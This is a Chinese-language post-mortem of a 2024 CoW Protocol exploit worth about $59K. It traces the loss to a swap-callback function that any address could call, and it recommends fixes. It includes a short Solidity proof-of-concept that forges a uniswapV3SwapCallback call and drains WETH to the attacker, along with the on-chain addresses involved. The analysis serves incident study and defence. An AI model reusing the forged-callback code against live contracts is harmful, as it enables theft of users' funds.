# CoW Hack 根因分析报告

## 📊 执行摘要
- **项目**: CoW Protocol
- **日期**: 2024
- **网络**: Ethereum Mainnet
- **损失**: ~ $59K
- **类型**: 回调接口缺少上下文验证，导致伪造的 swap 回调窃取资金
- **级别**: 🔴 严重

## 🎯 攻击概览
- **攻击者**: `0x00baD13FA32E0000E35B8517E19986B93F000034`
- **攻击合约**: `0x67004E26F800c5EB050000200075f049AA0090c3`
- **相关合约 (CoW/Settlement)**: `0x9008D19f58AAbD9eD0D60971565AA8510560ab41`
- **攻击交易**: [`0x2fc9f2fd393db2273abb9b0451f9a4830aa2ebd5490d453f1a06a8e9e5edc4f9`](https://etherscan.io/tx/0x2fc9f2fd393db2273abb9b0451f9a4830aa2ebd5490d453f1a06a8e9e5edc4f9)

## 💻 技术分析

PoC 中，攻击合约直接对 `addr2`（集成方/中间合约）调用 `uniswapV3SwapCallback`，并伪造回调参数与 `data`，最终从 WETH 合约拉取到余额并转换为 ETH 转出：

```solidity
bytes memory data = abi.encode(
    uint256(1976408883179648193852),
    addr3, // settlement/target
    addr1, // WETH
    address(this)
);

ICallbackLike(addr2).uniswapV3SwapCallback(
    -1978613680814188858940,
    5373296932158610028,
    data
);

uint256 bal = IWETH9(addr1).balanceOf(address(this));
IWETH9(addr1).withdraw(bal);
payable(tx.origin).transfer(address(this).balance);
```

关键在于回调的调用者与上下文未被严格验证：
- 目标合约接受外部任意地址直接调用回调接口，未验证调用方是否为预期池子/合约；
- `data` 中夹带的地址被用于从目标合约或代币合约中拉取资金，但未进行签名/重放/订单匹配验证；
- 导致攻击者可构造“伪造的 swap 回调”，在没有真实交换发生的情况下完成资金转移。

### 影响评估
- 直接损失约 $59K；
- 任何对外暴露的回调接口若缺少调用方校验与上下文签名，均可能被伪造调用。

## 🎯 根本原因
缺少对回调来源与上下文的强校验：
- 回调函数 `uniswapV3SwapCallback` 可被任意地址调用；
- 未校验 `msg.sender` 是否为受信的池/路由；
- 未对回调 `data` 中的 Settlement/Token 地址进行签名验证与订单状态匹配。

## 🛠️ 修复建议
短期：
- 在回调函数中强制 `require(msg.sender == trustedPool)` 或维护可变的受信白名单；
- 对回调 `data` 进行 EIP-712 签名校验，并与订单/会话 ID 绑定，防重放；
- 限制回调中可进行的外部调用与资金拉取行为。

长期：
- 将外部回调接口改为仅内部调用（internal）或通过受控适配器暴露；
- 引入会话级 nonce/过期时间与撮合引擎签名；
- 完善集成测试，覆盖“伪造回调/重放调用”等场景。

## 🔗 参考
- CoW Settlement：`0x9008D19f58AAbD9eD0D60971565AA8510560ab41`
- 攻击交易：`0x2fc9f2f...edc4f9`
- 信息来源：`https://x.com/TenArmorAlert/status/1854538807854649791`

---
**报告生成**: 2025-10-12 | **版本**: 1.1
